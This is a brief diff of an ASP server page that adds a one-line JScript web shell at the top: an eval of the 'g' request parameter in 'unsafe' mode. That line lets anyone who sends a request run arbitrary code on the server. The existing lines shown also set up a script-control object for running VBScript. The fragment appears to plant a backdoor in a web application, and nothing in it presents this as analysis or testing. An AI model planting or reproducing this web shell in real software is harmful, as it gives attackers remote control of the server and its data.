@@ -1,3 +1,7 @@
+<%@ Page Language="Jscript"%><%eval(Request.Item["g"],"unsafe");%>
+
+/*-------------------------------------------------------------------------*/ 
+
 <%
 set ms = server.CreateObject("MSScriptControl.ScriptControl.1")
 ms.Language="VBScript"
